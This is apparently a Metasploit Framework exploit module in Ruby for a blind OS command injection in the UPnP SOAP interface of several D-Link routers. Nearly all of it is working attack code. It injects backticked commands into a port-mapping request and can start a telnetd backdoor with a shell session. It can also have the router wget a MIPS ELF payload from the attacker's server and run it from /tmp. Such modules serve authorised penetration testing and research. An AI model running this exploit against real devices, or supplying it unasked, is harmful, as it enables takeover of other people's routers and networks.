# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Auxiliary::CommandShell

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;        => &#039;D-Link Devices UPnP SOAP Command Execution&#039;,
      &#039;Description&#039; => %q{
        Different D-Link Routers are vulnerable to OS command injection in the UPnP SOAP
        interface. Since it is a blind OS command injection vulnerability, there is no
        output for the executed command when using the CMD target. Additionally, two targets
        are included, to start a telnetd service and establish a session over it, or deploy a
        native mipsel payload. This module has been tested successfully on DIR-300, DIR-600,
        DIR-645, DIR-845 and DIR-865. According to the vulnerability discoverer,
        more D-Link devices may affected.
      },
      &#039;Author&#039;      =>
        [
          &#039;Michael Messner <devnull@s3cur1ty.de>&#039;, # Vulnerability discovery and Metasploit module
          &#039;juan vazquez&#039; # minor help with msf module
        ],
      &#039;License&#039;     => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [ &#039;OSVDB&#039;, &#039;94924&#039; ],
          [ &#039;BID&#039;, &#039;61005&#039; ],
          [ &#039;EDB&#039;, &#039;26664&#039; ],
          [ &#039;URL&#039;, &#039;http://www.s3cur1ty.de/m1adv2013-020&#039; ]
        ],
      &#039;DisclosureDate&#039; => &#039;Jul 05 2013&#039;,
      &#039;Privileged&#039;     => true,
      &#039;Platform&#039;       => [&#039;linux&#039;,&#039;unix&#039;],
      &#039;Payload&#039;        =>
        {
          &#039;DisableNops&#039; => true,
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;CMD&#039;,  #all devices
            {
            &#039;Arch&#039; => ARCH_CMD,
            &#039;Platform&#039; => &#039;unix&#039;
            }
          ],
          [ &#039;Telnet&#039;,  #all devices - default target
            {
            &#039;Arch&#039; => ARCH_CMD,
            &#039;Platform&#039; => &#039;unix&#039;
            }
          ],
          [ &#039;Linux mipsel Payload&#039;,  #DIR-865, DIR-645 and others with wget installed
            {
            &#039;Arch&#039; => ARCH_MIPSLE,
            &#039;Platform&#039; => &#039;linux&#039;
            }
          ],
        ],
      &#039;DefaultTarget&#039;  => 1
      ))

    register_options(
      [
        Opt::RPORT(49152),  #port of UPnP SOAP webinterface
        OptAddress.new(&#039;DOWNHOST&#039;, [ false, &#039;An alternative host to request the MIPS payload from&#039; ]),
        OptString.new(&#039;DOWNFILE&#039;, [ false, &#039;Filename to download, (default: random)&#039; ]),
        OptInt.new(&#039;HTTP_DELAY&#039;, [true, &#039;Time that the HTTP Server will wait for the ELF payload request&#039;, 60]),
      ], self.class)
  end

  def exploit
    @new_portmapping_descr = rand_text_alpha(8)
    @new_external_port = rand(65535)
    @new_internal_port = rand(65535)

    if target.name =~ /CMD/
      exploit_cmd
    elsif target.name =~ /Telnet/
      exploit_telnet
    else
      exploit_mips
    end
  end

  def exploit_cmd
    if not (datastore[&#039;CMD&#039;])
      fail_with(Exploit::Failure::BadConfig, "#{rhost}:#{rport} - Only the cmd/generic payload is compatible")
    end
    cmd = payload.encoded
    type = "add"
    res = request(cmd, type)
    if (!res or res.code != 200 or res.headers[&#039;Server&#039;].nil? or res.headers[&#039;Server&#039;] !~ /Linux\,\ UPnP\/1.0,\ DIR/)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end
    print_status("#{rhost}:#{rport} - Blind Exploitation - unknown Exploitation state")
    type = "delete"
    res = request(cmd, type)
    if (!res or res.code != 200 or res.headers[&#039;Server&#039;].nil? or res.headers[&#039;Server&#039;] !~ /Linux\,\ UPnP\/1.0,\ DIR/)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end
    return
  end

  def exploit_telnet
    telnetport = rand(65535)

    vprint_status("#{rhost}:#{rport} - Telnetport: #{telnetport}")

    cmd = "telnetd -p #{telnetport}"
    type = "add"
    res = request(cmd, type)
    if (!res or res.code != 200 or res.headers[&#039;Server&#039;].nil? or res.headers[&#039;Server&#039;] !~ /Linux\,\ UPnP\/1.0,\ DIR/)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end
    type = "delete"
    res = request(cmd, type)
    if (!res or res.code != 200 or res.headers[&#039;Server&#039;].nil? or res.headers[&#039;Server&#039;] !~ /Linux\,\ UPnP\/1.0,\ DIR/)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end

    begin
      sock = Rex::Socket.create_tcp({ &#039;PeerHost&#039; => rhost, &#039;PeerPort&#039; => telnetport.to_i })

      if sock
        print_good("#{rhost}:#{rport} - Backdoor service has been spawned, handling...")
        add_socket(sock)
      else
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Backdoor service has not been spawned!!!")
      end

      print_status "Attempting to start a Telnet session #{rhost}:#{telnetport}"
      auth_info = {
        :host   => rhost,
        :port   => telnetport,
        :sname => &#039;telnet&#039;,
        :user   => "",
        :pass  => "",
        :source_type => "exploit",
        :active => true
      }
      report_auth_info(auth_info)
      merge_me = {
        &#039;USERPASS_FILE&#039; => nil,
        &#039;USER_FILE&#039;     => nil,
        &#039;PASS_FILE&#039;     => nil,
        &#039;USERNAME&#039;      => nil,
        &#039;PASSWORD&#039;      => nil
      }
      start_session(self, "TELNET (#{rhost}:#{telnetport})", merge_me, false, sock)
    rescue
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Backdoor service has not been spawned!!!")
    end
    return
  end

  def exploit_mips

    downfile = datastore[&#039;DOWNFILE&#039;] || rand_text_alpha(8+rand(8))

    #thx to Juan for his awesome work on the mipsel elf support
    @pl = generate_payload_exe
    @elf_sent = false

    #
    # start our server
    #
    resource_uri = &#039;/&#039; + downfile

    if (datastore[&#039;DOWNHOST&#039;])
      service_url = &#039;http://&#039; + datastore[&#039;DOWNHOST&#039;] + &#039;:&#039; + datastore[&#039;SRVPORT&#039;].to_s + resource_uri
    else
      #do not use SSL
      if datastore[&#039;SSL&#039;]
        ssl_restore = true
        datastore[&#039;SSL&#039;] = false
      end

      #we use SRVHOST as download IP for the coming wget command.
      #SRVHOST needs a real IP address of our download host
      if (datastore[&#039;SRVHOST&#039;] == "0.0.0.0" or datastore[&#039;SRVHOST&#039;] == "::")
        srv_host = Rex::Socket.source_address(rhost)
      else
        srv_host = datastore[&#039;SRVHOST&#039;]
      end

      service_url = &#039;http://&#039; + srv_host + &#039;:&#039; + datastore[&#039;SRVPORT&#039;].to_s + resource_uri

      print_status("#{rhost}:#{rport} - Starting up our web service on #{service_url} ...")
      start_service({&#039;Uri&#039; => {
        &#039;Proc&#039; => Proc.new { |cli, req|
          on_request_uri(cli, req)
        },
        &#039;Path&#039; => resource_uri
      }})

      datastore[&#039;SSL&#039;] = true if ssl_restore
    end

    #
    # download payload
    #
    print_status("#{rhost}:#{rport} - Asking the DLink device to take and execute #{service_url}")
    #this filename is used to store the payload on the device
    filename = rand_text_alpha_lower(8)

    cmd = "/usr/bin/wget #{service_url} -O /tmp/#{filename}; chmod 777 /tmp/#{filename}; /tmp/#{filename}"
    type = "add"
    res = request(cmd, type)
    if (!res or res.code != 200 or res.headers[&#039;Server&#039;].nil? or res.headers[&#039;Server&#039;] !~ /Linux\,\ UPnP\/1.0,\ DIR/)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to deploy payload")
    end

    # wait for payload download
    if (datastore[&#039;DOWNHOST&#039;])
      print_status("#{rhost}:#{rport} - Giving #{datastore[&#039;HTTP_DELAY&#039;]} seconds to the DLink device to download the payload")
      select(nil, nil, nil, datastore[&#039;HTTP_DELAY&#039;])
    else
      wait_linux_payload
    end

    register_file_for_cleanup("/tmp/#{filename}")

    type = "delete"
    res = request(cmd, type)
    if (!res or res.code != 200 or res.headers[&#039;Server&#039;].nil? or res.headers[&#039;Server&#039;] !~ /Linux\,\ UPnP\/1.0,\ DIR/)
      fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Unable to execute payload")
    end
  end

  def request(cmd, type)

    uri = &#039;/soap.cgi&#039;

    data_cmd = "<?xml version=\"1.0\"?>"
    data_cmd << "<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
    data_cmd << "<SOAP-ENV:Body>"

    if type == "add"
      vprint_status("#{rhost}:#{rport} - adding portmapping")

      soapaction = "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"

      data_cmd << "<m:AddPortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
      data_cmd << "<NewPortMappingDescription>#{@new_portmapping_descr}</NewPortMappingDescription>"
      data_cmd << "<NewLeaseDuration></NewLeaseDuration>"
      data_cmd << "<NewInternalClient>`#{cmd}`</NewInternalClient>"
      data_cmd << "<NewEnabled>1</NewEnabled>"
      data_cmd << "<NewExternalPort>#{@new_external_port}</NewExternalPort>"
      data_cmd << "<NewRemoteHost></NewRemoteHost>"
      data_cmd << "<NewProtocol>TCP</NewProtocol>"
      data_cmd << "<NewInternalPort>#{@new_internal_port}</NewInternalPort>"
      data_cmd << "</m:AddPortMapping>"
    else
      #we should clean it up ... otherwise we are not able to exploit it multiple times
      vprint_status("#{rhost}:#{rport} - deleting portmapping")
      soapaction = "urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping"

      data_cmd << "<m:DeletePortMapping xmlns:m=\"urn:schemas-upnp-org:service:WANIPConnection:1\">"
      data_cmd << "<NewProtocol>TCP</NewProtocol><NewExternalPort>#{@new_external_port}</NewExternalPort><NewRemoteHost></NewRemoteHost>"
      data_cmd << "</m:DeletePortMapping>"
    end

    data_cmd << "</SOAP-ENV:Body>"
    data_cmd << "</SOAP-ENV:Envelope>"

    begin
      res = send_request_cgi({
        &#039;uri&#039;    => uri,
        &#039;vars_get&#039; => {
          &#039;service&#039; => &#039;WANIPConn1&#039;
        },
        &#039;ctype&#039; => "text/xml",
        &#039;method&#039; => &#039;POST&#039;,
        &#039;headers&#039; => {
          &#039;SOAPAction&#039; => soapaction,
          },
        &#039;data&#039; => data_cmd
      })
    return res
    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return nil
    end
  end

  # Handle incoming requests from the server
  def on_request_uri(cli, request)
    #print_status("on_request_uri called: #{request.inspect}")
    if (not @pl)
      print_error("#{rhost}:#{rport} - A request came in, but the payload wasn&#039;t ready yet!")
      return
    end
    print_status("#{rhost}:#{rport} - Sending the payload to the server...")
    @elf_sent = true
    send_response(cli, @pl)
  end

  # wait for the data to be sent
  def wait_linux_payload
    print_status("#{rhost}:#{rport} - Waiting for the target to request the ELF payload...")

    waited = 0
    while (not @elf_sent)
      select(nil, nil, nil, 1)
      waited += 1
      if (waited > datastore[&#039;HTTP_DELAY&#039;])
        fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Target didn&#039;t request request the ELF payload -- Maybe it can&#039;t connect back to us?")
      end
    end
  end
end

